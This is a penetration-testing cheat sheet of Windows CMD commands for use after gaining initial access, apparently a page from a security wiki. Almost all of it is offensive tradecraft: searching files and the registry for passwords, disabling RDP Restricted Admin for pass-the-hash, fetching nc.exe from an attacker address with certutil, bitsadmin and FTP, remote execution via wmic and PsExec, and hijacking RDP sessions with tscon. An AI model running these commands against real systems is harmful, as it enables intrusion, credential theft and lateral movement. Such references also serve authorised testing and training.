---
tags: [shell, reference, tool]
module: core
last_updated: 2026-05-11
source_count: 0
---

# Windows CMD — Penetration Testing Quick Reference

Essential Windows Command Prompt commands. Useful post-initial-access when PowerShell is restricted or flagged.

## System Enumeration

```cmd
:: OS and build info
systeminfo
ver

:: Current user and privileges
whoami
whoami /priv
whoami /groups
whoami /all

:: Hostname
hostname

:: Environment variables
set
echo %USERNAME%
echo %COMPUTERNAME%
echo %USERPROFILE%
echo %APPDATA%
echo %TEMP%
```

## User and Group Enumeration

```cmd
:: Local users
net user

:: Details on a specific user
net user administrator

:: Local groups
net localgroup

:: Members of Administrators group
net localgroup administrators

:: Domain users (if domain-joined)
net user /domain

:: Domain groups
net group /domain

:: Domain admins
net group "Domain Admins" /domain
```

## Network Information

```cmd
:: Interfaces and IPs
ipconfig /all

:: Routing table
route print

:: ARP cache (adjacent hosts)
arp -a

:: Active TCP connections
netstat -ano

:: Firewall rules
netsh advfirewall firewall show rule name=all

:: DNS cache (often reveals internal hostnames)
ipconfig /displaydns

:: Hosts file
type C:\Windows\System32\drivers\etc\hosts

:: DNS servers
nslookup
```

## Process and Service Enumeration

```cmd
:: Running processes (with PID and path)
tasklist /v
tasklist /svc

:: Kill a process by PID
taskkill /PID 1234 /F

:: Services
sc query
sc query state= all
net start

:: Query a specific service
sc qc "service_name"

:: Scheduled tasks
schtasks /query /fo LIST /v
```

## File System

```cmd
:: List directory (including hidden)
dir /a C:\

:: Recursive listing
dir /s /b C:\Users\*.txt

:: Search for files containing a string
findstr /si "password" C:\*.txt C:\*.ini C:\*.config

:: Read a file
type C:\path\to\file.txt

:: Find files by name
where /r C:\ *.config
dir /s /b "password" 2>nul

:: Interesting credential locations
type "%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
type "%USERPROFILE%\.ssh\config"
dir "%APPDATA%\Microsoft\Credentials\"
dir "%LOCALAPPDATA%\Microsoft\Credentials\"

:: Check for unquoted service paths
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows"
```

## Registry

```cmd
:: Query a key
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion

:: Credential stores in registry
reg query HKLM /f "password" /t REG_SZ /s
reg query HKCU /f "password" /t REG_SZ /s

:: AutoLogon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

:: Disable Restricted Admin Mode (for RDP PTH)
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

## Privilege Escalation Helpers

```cmd
:: Check for always-install-elevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: WMIC for OS and hotfix info (patch level → CVE lookup)
wmic os get Caption,Version,BuildNumber
wmic qfe get Caption,Description,HotFixID,InstalledOn

:: WMIC processes with paths
wmic process get caption,executablepath,commandline

:: WMIC service paths (unquoted service path hunt)
wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"

:: Check if token privileges include SeImpersonatePrivilege
whoami /priv | findstr "SeImpersonate SeAssignPrimaryToken"
```

## File Transfer

```cmd
:: certutil download (LOLBin — often allowed)
certutil -urlcache -split -f http://10.10.14.15:8080/nc.exe C:\Windows\Temp\nc.exe

:: bitsadmin download
bitsadmin /transfer job /download /priority normal http://10.10.14.15:8080/file.exe C:\Temp\file.exe

:: SMB copy (if share accessible)
copy \\10.10.14.15\share\file.exe C:\Temp\file.exe

:: FTP scriptable download
echo open 10.10.14.15> ftp.txt
echo USER anonymous>> ftp.txt
echo binary>> ftp.txt
echo GET nc.exe>> ftp.txt
echo quit>> ftp.txt
ftp -s:ftp.txt
```

## Lateral Movement / Credential Use

```cmd
:: Map a network share with credentials
net use \\10.129.14.128\share /user:domain\username password

:: Run command on remote host (requires admin share + DCOM)
wmic /node:10.129.14.128 /user:administrator /password:password123 process call create "cmd.exe /c whoami"

:: PsExec (Sysinternals)
PsExec.exe \\10.129.14.128 -u administrator -p password123 cmd.exe
```

## Session Hijacking (RDP)

```cmd
:: List active sessions
query user

:: Hijack session (requires SYSTEM)
tscon 2 /dest:rdp-tcp#13

:: Create service to tscon (escalation from local admin)
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
net start sessionhijack
```

## Related pages

- [[shell_commands/bash]]
- [[shell_commands/powershell]]
- [[attack/rdp]]
- [[attack/smb]]
- [[definitions/security_terminology]]
